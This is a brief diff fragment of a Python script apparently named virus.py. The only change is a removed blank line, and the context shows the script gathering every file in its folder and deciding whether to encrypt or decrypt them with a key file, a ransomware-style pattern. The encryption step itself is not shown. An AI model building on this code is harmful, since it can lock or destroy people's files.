@@ -5,7 +5,6 @@ from cryptography.fernet import Fernet
 # Getting all the files in the directory
 files = [f for f in os.listdir() if (f != "virus.py" and f != "Secrets.key" and os.path.isfile(f))]
 
-
 #Deciding if it needs to encrypt or decrypt the files
 encrypted = os.path.exists("./Secrets.key")
 if(not encrypted):
